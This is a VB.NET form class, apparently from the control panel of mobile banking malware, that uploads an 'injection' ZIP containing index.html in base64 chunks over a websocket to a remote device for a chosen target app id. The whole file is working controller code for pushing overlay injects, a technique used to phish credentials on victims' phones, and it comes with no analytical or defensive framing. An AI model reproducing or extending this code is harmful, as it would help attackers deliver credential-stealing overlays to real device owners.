Imports System.IO
Imports System.Security.Cryptography

Public Class jectormaker

    Public targetid As String
    Public mobid As String

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon2.Click
        Dim openFileDialog As New OpenFileDialog()

        ' Set the filter to allow only .zip files
        openFileDialog.Filter = "ZIP Files (*.zip)|*.zip|All Files (*.*)|*.*"
        openFileDialog.Title = "Select a ZIP File"

        ' Show the dialog and check if the user selected a file
        If openFileDialog.ShowDialog() = DialogResult.OK Then
            ' Retrieve the selected file path
            Dim selectedFilePath As String = openFileDialog.FileName

            Dim fileNames As List(Of String) = ListZipFileNames(selectedFilePath)

            If Not fileNames.Contains("index.html") Then
                BTAlerter.infos(noindxstr)
                Return
            End If

            zippath.Text = selectedFilePath
            injctbtn.Enabled = True
            statelabel.Text = statesstr + ": " + readystr
        End If
    End Sub


    Private Sub jectormaker_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        targettitle.Text = $"{trgetstr}: " + targetid
        statelabel.Text = statesstr + ": " + waitngstr
    End Sub

    Private Sub uploadworker_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles uploadworker.DoWork
        Dim filePath As String = zippath.Text
        Dim file As New FileInfo(filePath)
        Dim totalBytes As Long = file.Length


        Dim bufferSize As Integer = CalculateBufferSize(totalBytes)
        Dim buffer(bufferSize - 1) As Byte
        Dim totalBytesRead As Long = 0
        Dim chunkNumber As Integer = 0


        Dim md5Hash As String = CalculateMD5(filePath)
        Me.Invoke(Sub()
                      statelabel.Text = statesstr + ": " + snddatastr
                  End Sub)
        Using fs As New FileStream(filePath, FileMode.Open, FileAccess.Read)
            Dim bytesRead As Integer

            Do
                bytesRead = fs.Read(buffer, 0, buffer.Length)

                If bytesRead > 0 Then
                    totalBytesRead += bytesRead


                    Dim base64Chunk As String = Convert.ToBase64String(buffer, 0, bytesRead)


                    Dim message As New Dictionary(Of String, Object) From {
                        {"filehash", md5Hash},
                        {"savepath", "p"},
                        {"isinjct", "1"},
                        {"jctid", targetid},
                        {"filename", file.Name},
                        {"filedata", base64Chunk},
                        {"totalSize", totalBytes},
                        {"sentSize", totalBytesRead},
                        {"chunkNumber", chunkNumber},
                        {"msg", "upload"}
                    }

                    BTEngine.commands(message, mobid, BTEngine.MainForm.webSocketClient)

                    chunkNumber += 1

                    Me.Invoke(Sub()
                                  Dim progressPercentage As Integer = CInt((totalBytesRead / totalBytes) * 100)
                                  uploadprogress.Value = progressPercentage


                              End Sub)
                    Threading.Thread.Sleep(10)

                End If
            Loop While bytesRead > 0
        End Using
        Me.Invoke(Sub()
                      uploadprogress.ForeColor = Color.Lime
                      statelabel.Text = statesstr + ": " + compltstr
                      injctbtn.Visible = False
                      closebtn.Enabled = True
                      closebtn.Visible = True
                  End Sub)
    End Sub

    Private Sub injctbtn_Click(sender As Object, e As EventArgs) Handles injctbtn.Click
        Dim zipdata As String = zippath.Text
        If isEmpty(zipdata) Then
            BTAlerter.infos("Select injection data first")
            Return
        End If
        If Not File.Exists(zipdata) Then
            BTAlerter.infos(".zip file not found.")
            Return
        End If
        If uploadworker.IsBusy Then
            Return
        End If
        uploadworker.RunWorkerAsync()
    End Sub

    Private Sub closebtn_Click(sender As Object, e As EventArgs) Handles closebtn.Click
        uploadworker.Dispose()
        Me.Close()
    End Sub
End Class